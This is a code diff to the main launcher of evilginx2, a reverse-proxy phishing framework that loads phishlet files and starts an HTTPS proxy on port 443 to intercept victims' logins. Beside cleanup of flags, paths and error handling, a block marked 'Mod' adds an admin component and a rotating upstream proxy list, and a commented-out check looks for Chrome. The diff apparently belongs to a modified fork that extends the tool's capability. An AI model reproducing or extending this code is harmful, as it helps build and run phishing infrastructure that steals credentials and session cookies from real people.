@@ -2,7 +2,6 @@ package main
 
 import (
 	"flag"
-	"io/ioutil"
 	"os"
 	"os/user"
 	"path/filepath"
@@ -13,13 +12,15 @@ import (
 	"github.com/kgretzky/evilginx2/log"
 )
 
-var phishlets_dir = flag.String("p", "", "Phishlets directory path")
-var templates_dir = flag.String("t", "", "HTML templates directory path")
-var debug_log = flag.Bool("debug", false, "Enable debug output")
-var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
-var cfg_dir = flag.String("c", "", "Configuration directory path")
+var (
+	phishlets_dir  = flag.String("p", "./phishlets", "Phishlets directory path")
+	templates_dir  = flag.String("t", "", "HTML templates directory path")
+	debug_log      = flag.Bool("debug", false, "Enable debug output")
+	developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
+	cfg_dir        = flag.String("c", "./config", "Configuration directory path")
+)
 
-func joinPath(base_path string, rel_path string) string {
+func joinPath(base_path, rel_path string) string {
 	var ret string
 	if filepath.IsAbs(rel_path) {
 		ret = rel_path
@@ -28,6 +29,13 @@ func joinPath(base_path string, rel_path string) string {
 	}
 	return ret
 }
+
+// func init() {
+// 	if _, has := launcher.LookPath(); !has {
+// 		log.Warning("Google Chrome/Chromium not found. Please install it.\nInstall guide: https://github.com/go-rod/go-rod.github.io/blob/master/compatibility.md")
+// 		os.Exit(1)
+// 	}
+// }
 
 func main() {
 	exe_path, _ := os.Executable()
@@ -59,7 +67,10 @@ func main() {
 		return
 	}
 	if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
-		os.MkdirAll(*templates_dir, os.FileMode(0700))
+		err = os.MkdirAll(*templates_dir, os.FileMode(0o700))
+		if err != nil {
+			log.Error("creating dir: %v", err)
+		}
 	}
 
 	log.DebugEnable(*debug_log)
@@ -82,7 +93,7 @@ func main() {
 	config_path := *cfg_dir
 	log.Info("loading configuration from: %s", config_path)
 
-	err := os.MkdirAll(*cfg_dir, os.FileMode(0700))
+	err := os.MkdirAll(*cfg_dir, os.FileMode(0o700))
 	if err != nil {
 		log.Fatal("%v", err)
 		return
@@ -90,7 +101,7 @@ func main() {
 
 	crt_path := joinPath(*cfg_dir, "./crt")
 
-	if err := core.CreateDir(crt_path, 0700); err != nil {
+	if err := core.CreateDir(crt_path, 0o700); err != nil { //nolint:gocritic // false positive
 		log.Fatal("mkdir: %v", err)
 		return
 	}
@@ -107,6 +118,14 @@ func main() {
 		log.Fatal("database: %v", err)
 		return
 	}
+	// Mod
+	core.NewAdmin(db, cfg, *cfg_dir)
+
+	proxies := []string{}
+	if cfg.GetSessionProxy() {
+		proxies = core.ReadProxyList(*cfg_dir)
+	}
+	// End mod
 
 	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
 	if err != nil {
@@ -114,28 +133,28 @@ func main() {
 		return
 	}
 
-	files, err := ioutil.ReadDir(phishlets_path)
+	files, err := os.ReadDir(phishlets_path)
 	if err != nil {
 		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
 		return
 	}
 	for _, f := range files {
-		if !f.IsDir() {
-			pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
-			rpname := pr.FindStringSubmatch(f.Name())
-			if rpname == nil || len(rpname) < 2 {
+		if f.IsDir() {
+			continue
+		}
+		pr := regexp.MustCompile(`([a-zA-Z0-9\-.]*)\.yaml`)
+		rpname := pr.FindStringSubmatch(f.Name())
+		if rpname == nil || len(rpname) < 2 {
+			continue
+		}
+		pname := rpname[1]
+		if pname != "" {
+			pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), cfg)
+			if err != nil {
+				log.Error("failed to load phishlet '%s': %v", f.Name(), err)
 				continue
 			}
-			pname := rpname[1]
-			if pname != "" {
-				pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), cfg)
-				if err != nil {
-					log.Error("failed to load phishlet '%s': %v", f.Name(), err)
-					continue
-				}
-				//log.Info("loaded phishlet '%s' made by %s from '%s'", pl.Name, pl.Author, f.Name())
-				cfg.AddPhishlet(pname, pl)
-			}
+			cfg.AddPhishlet(pname, pl)
 		}
 	}
 
@@ -150,8 +169,12 @@ func main() {
 		return
 	}
 
-	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, *developer_mode)
-	hp.Start()
+	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, proxies, *developer_mode)
+	err = hp.Start()
+	if err != nil {
+		log.Fatal("http proxy: %v", err)
+		return
+	}
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
 	if err != nil {
